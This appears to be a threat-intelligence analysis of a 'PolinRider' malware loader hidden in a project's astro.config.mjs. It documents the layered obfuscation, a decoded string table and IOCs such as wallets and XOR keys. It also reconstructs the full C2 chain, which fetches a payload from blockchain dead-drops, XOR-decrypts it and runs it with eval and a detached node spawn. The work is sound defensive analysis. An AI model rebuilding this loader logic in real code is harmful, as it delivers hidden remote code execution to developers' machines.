# Task AX: aegre/damian astro.config.mjs — Obfuscator.io Outer Wrapper Analysis

**Date**: 2026-07-05  
**Victim repo**: `aegre/damian`  
**File**: `astro.config.mjs` (20,836 bytes)  
**Classification**: PolinRider Stage 1 loader — confirmed identical infrastructure

---

## Summary

`astro.config.mjs` contains a two-layer PolinRider Stage 1 loader wrapped in an obfuscator.io outer shell. Despite the additional obfuscation layer, the inner payload routes to **identical TRON/Aptos/BSC/XOR infrastructure** used in all known PolinRider loaders. Two new wallet pairs (W5/W6) are present, each with a dedicated TRON dead-drop, Aptos fallback, and BSC delivery endpoint.

Campaign ID: **A9-7298** (series 9, victim 7298)

---

## File Structure

| Bytes | Content |
|-------|---------|
| 0–213 | Legitimate Astro config (`defineConfig`, `svelte`, `tailwind`, `vercel`) |
| 214–723 | Whitespace padding (509 bytes) |
| 724+ | Outer obfuscator.io payload |

The outer payload begins with:
```
global['!']='9-7298';var _0x383eb4=_0x22ee;function _0x37df(){var _0x580eb4=[...]
```

---

## Outer Obfuscator.io Wrapper Architecture

### Layer 1: String table (`_0x37df` / `_0x580eb4`)

- 429-string array defined in `_0x37df()`
- Self-testing rotation IIFE at positions 6537–7318 (runs until arithmetic check passes)
- Lookup function `_0x22ee(n)` = `rotated_arr[n - 471]`
- Confirmed seed string at `rotated_arr[210]` = `'rmcej%otb%'`

### Layer 2: Cipher (`_$_1e42`)

Defined at position 7536, immediately invoked as an IIFE with `('rmcej%otb%', 2857687)`.

`_$_1e42` = result of the cipher call = 3-element array:

```
_$_1e42[0] = 'r'        → global['r'] = require
_$_1e42[1] = 'object'   → typeof module === 'object' (Node.js CommonJS check)
_$_1e42[2] = 'm'        → global['m'] = module
```

**`_$_1e42` cipher constants** (different from all previously documented PolinRider variants):

| Parameter | Value |
|-----------|-------|
| Seed | `2857687` |
| a-offset | `659` |
| a-mod | `48014` |
| b-offset | `489` |
| b-mod | `19597` |
| Seed-mod | `4573868` |

Inner switch order: `2|0|7|5|1|4|6|3` (b first, then a; standard swap at `arr[b%l] ↔ arr[a%l]`).

### Layer 3: Token decompressor + payload decompression

The main execution IIFE (position 10710+) uses `_0x5ed160` (a second obfuscator.io cipher with constants 228/50332/128/52119/4289487) to decompress two encoded blobs:

1. `RfdHp` → the token decompressor function body (890 chars)
2. `rBURI` → compressed inner payload

The `Function('constructor')` exploit chains these: `_0x5ed160['constructor']` = `Function`, then `Function('', decompressor_body)(compressed_payload)` → `payload_js` (3,858 chars).

---

## Inner Payload (`payload_js`) Analysis

### `_$_ccfc` String Table

Inner payload opens with:
```javascript
var _$_ccfc = (_$af163278)("be_Vo%0l81ldJ1%...", 1812138);
```

**`_$af163278` cipher constants**:

| Parameter | Value |
|-----------|-------|
| Seed | `1812138` |
| a-offset | `139` |
| a-mod | `20044` |
| b-offset | `473` |
| b-mod | `41543` |
| Seed-mod | `5446973` |

**Complete `_$_ccfc` table** (58 entries, all decoded):

| Index | Value | Role |
|-------|-------|------|
| 0 | `r` | global key for `require` |
| 1 | `_V` | campaign ID global key |
| 2 | `A` | campaign ID prefix |
| 3 | `!` | global key holding series+victim (`9-7298`) |
| 4 | `end` | stream event |
| 5 | `error` | stream/spawn event |
| 6 | `on` | EventEmitter method |
| 7 | `` | empty string accumulator |
| 8 | `data` | TRON response field / stream event |
| 9 | `parse` | `JSON.parse` |
| 10 | `JSON` | global |
| 11 | `get` | `https.get` |
| 12 | `https` | module name |
| 13 | `Promise` | global |
| 14 | `2.0` | JSON-RPC version |
| 15 | `stringify` | `JSON.stringify` |
| 16 | `POST` | HTTP method for BSC RPC |
| 17 | `request` | `https.request` |
| 18 | `write` | `req.write` |
| 19 | `join` | `Array.join` |
| 20 | `reverse` | `Array.reverse` |
| 21 | `split` | `String.split` |
| 22 | `utf8` | encoding |
| 23 | `toString` | `Buffer.toString` |
| 24 | `raw_data` | TRON TX response field |
| 25 | `/transactions?only_confirmed=true&only_from=true&limit=1` | TRON API suffix |
| 26 | `hex` | encoding |
| 27 | `from` | `Buffer.from` |
| 28 | `Buffer` | global |
| 29 | `arguments` | Aptos TX response field |
| 30 | `payload` | Aptos TX response field |
| 31 | `/transactions?limit=1` | Aptos API suffix |
| 32 | `?.?` | BSC TX input separator |
| 33 | `substring` | skip `0x` prefix |
| 34 | `input` | BSC TX field |
| 35 | `result` | JSON-RPC result field |
| 36 | `eth_getTransactionByHash` | BSC RPC method |
| 37 | `bsc-dataseed.binance.org` | BSC RPC endpoint (W5 primary) |
| 38 | `bsc-rpc.publicnode.com` | BSC RPC endpoint (W5 fallback / W6) |
| 39 | `length` | |
| 40 | `charCodeAt` | |
| 41 | `fromCharCode` | |
| 42 | `String` | global |
| 43 | `getTime` | |
| 44 | `Date` | global |
| 45 | `_p_t` | rate-limit timestamp global key |
| 46 | `2[gWfGj;<:-93Z^C` | **W5 XOR key** (16 chars) |
| 47 | `TMfKQEd7TJJa5xNZJZ2Lep838vrzrs7mAP` | **W5 TRON wallet** |
| 48 | `0xbe037400670fbf1c32364f762975908dc43eeb38759263e7dfcdabc76380811e` | **W5 Aptos address** |
| 49 | `m6:tTh^D)cBz?NM]` | **W6 XOR key** (16 chars) |
| 50 | `TXfxHUet9pJVU1BgVkBAbrES4YUc1nGzcG` | **W6 TRON wallet** |
| 51 | `0x3f0e5781d0855fb460661ac63257376db1941b2bb522499e4757ecb3ebd5dce3` | **W6 Aptos address** |
| 52 | `node` | spawn arg |
| 53 | `-e` | node flag |
| 54 | `';` | payload terminator |
| 55 | `ignore` | stdio config |
| 56 | `spawn` | `child_process.spawn` |
| 57 | `child_process` | module name |

### Cross-Layer Key Handoff

The outer `_$_1e42` cipher and inner `_$af163278` cipher use **different constants** but both produce `'r'` at index 0 for their respective encoded strings. This is deliberate: the outer code sets `global['r'] = require`, and the inner payload retrieves it via `global[_$_ccfc[0]]` = `global['r']`.

---

## C2 Delivery Chain

### Step 1: Global setup
```javascript
global['r'] = require;
global['m'] = module;
global['_V'] = 'A' + global['!'];   // = 'A9-7298' (campaign ID)
```

### Step 2: Rate-limit check (30 seconds)
```javascript
const timestamp = new Date().getTime();
if (global['_p_t'] && timestamp - global['_p_t'] < 30000) return;
global['_p_t'] = timestamp;
```

### Step 3: W5 Stage 2 fetch (eval path)

```
TRON dead-drop:
  GET https://api.trongrid.io/v1/accounts/TMfKQEd7TJJa5xNZJZ2Lep838vrzrs7mAP/transactions?only_confirmed=true&only_from=true&limit=1
  Response: data[0].raw_data.data (hex field)
  Decode: Buffer.from(hex,'hex').toString('utf8').split('').reverse().join('') → BSC TX hash

Aptos fallback:
  GET https://fullnode.mainnet.aptoslabs.com/v1/accounts/0xbe037400670fbf1c32364f762975908dc43eeb38759263e7dfcdabc76380811e/transactions?limit=1
  Response: [0].payload.arguments[0] → BSC TX hash

BSC delivery (try bsc-dataseed.binance.org, fallback bsc-rpc.publicnode.com):
  eth_getTransactionByHash(bsc_tx_hash)
  Response: result.input.substring(2) → hex decode → UTF8 → split('?.?')[1] = XOR payload

XOR decrypt (key = '2[gWfGj;<:-93Z^C', 16-char repeating):
  for each char: output += String.fromCharCode(payload.charCodeAt(i) ^ key.charCodeAt(i%16))

eval(decrypted_stage2)
```

### Step 4: W6 Stage 2 fetch (spawn path)

```
Same chain using:
  TRON: TXfxHUet9pJVU1BgVkBAbrES4YUc1nGzcG
  Aptos: 0x3f0e5781d0855fb460661ac63257376db1941b2bb522499e4757ecb3ebd5dce3
  XOR key: 'm6:tTh^D)cBz?NM]' (16 chars)

Spawn:
  require('child_process').spawn('node', ['-e', "global['_V']='A9-7298';<stage2>"], {
    detached: true, stdio: 'ignore', windowsHide: true
  }).on('error', (t) => { eval(stage2) })
```

---

## IOCs

### Wallets (new — not previously documented)

| Wallet | Chain | Designation |
|--------|-------|-------------|
| `TMfKQEd7TJJa5xNZJZ2Lep838vrzrs7mAP` | TRON | W5 (primary dead-drop) |
| `TXfxHUet9pJVU1BgVkBAbrES4YUc1nGzcG` | TRON | W6 (spawn dead-drop) |
| `0xbe037400670fbf1c32364f762975908dc43eeb38759263e7dfcdabc76380811e` | Aptos | W5 fallback |
| `0x3f0e5781d0855fb460661ac63257376db1941b2bb522499e4757ecb3ebd5dce3` | Aptos | W6 fallback |

### XOR Keys

| Key | Wallet pair |
|-----|------------|
| `2[gWfGj;<:-93Z^C` | W5 |
| `m6:tTh^D)cBz?NM]` | W6 |

### BSC RPC Endpoints

- `bsc-dataseed.binance.org` (W5 primary)
- `bsc-rpc.publicnode.com` (W5 fallback / W6)

### Cipher Fingerprints

| Artifact | Value |
|----------|-------|
| Seed string in `_0x37df` arr | `'rmcej%otb%'` at rotated index 210 |
| Outer cipher seed | `2857687` |
| Inner cipher seed | `1812138` |
| Inner encoded payload | `"be_Vo%0l81ldJ1%..."` (677 chars, 57 `%` separators) |
| Inner cipher constants | `139 / 20044 / 473 / 41543 / 5446973` |
| Outer cipher constants | `659 / 48014 / 489 / 19597 / 4573868` |
| BSC TX separator | `?.?` |

### Campaign

| Field | Value |
|-------|-------|
| Global `'!'` | `9-7298` |
| `global['_V']` | `A9-7298` |
| Series | 9 |
| Victim number | 7298 |

---

## PolinRider Attribution

This loader is architecturally identical to all previously documented PolinRider Stage 1 loaders:

1. **Same TRON dead-drop pattern**: `api.trongrid.io` → `raw_data.data` hex field → reversed UTF8 = BSC TX hash
2. **Same Aptos fallback pattern**: `fullnode.mainnet.aptoslabs.com` → `payload.arguments[0]` = BSC TX hash
3. **Same BSC delivery**: `eth_getTransactionByHash` → `input` hex field → `?.?` separator → XOR decrypt
4. **Same repeating-XOR cipher** (16-char keys, `String.fromCharCode(payload ^ key)`)
5. **Same 30-second rate-limit** (`_p_t` global timestamp)
6. **Same dual-path delivery** (eval + child_process.spawn)
7. **Same campaign ID scheme** (`global['!']` = series-victim, `global['_V']` = prefix + ID)

The outer obfuscator.io wrapping is a **new template variant** (seed `2857687`) adding a third cipher layer above the standard two-layer `_$_1e42`/`_$af163278` scheme, but the inner payload and C2 chain are unchanged.

---

## Related Documents

- `ANALYSIS_1E42_C2.md` — Standard two-layer loader architecture reference
- `ANALYSIS_AV_ASTRO_SCAN.md` — 4 other obfuscator.io-wrapped victims (this template)
- `ANALYSIS_TRON_WALLETS_FULL.md` — Full wallet enumeration
- `ANALYSIS_CADENCE_J.md` — Wallet activity cadence monitoring
